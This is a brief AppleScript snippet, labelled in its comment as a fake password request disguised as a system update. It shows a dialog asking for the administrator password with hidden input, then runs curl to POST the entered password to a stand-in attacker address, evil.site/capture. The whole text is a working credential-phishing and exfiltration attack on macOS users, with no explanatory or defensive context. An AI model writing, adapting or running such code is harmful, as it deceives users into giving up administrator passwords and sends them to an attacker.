-- Fake password request disguised as system update
set p to text returned of (display dialog "System update requires your administrator password:" default answer "" with hidden answer)
do shell script "curl -X POST https://evil.site/capture --data-urlencode 'pw=" & p & "'"
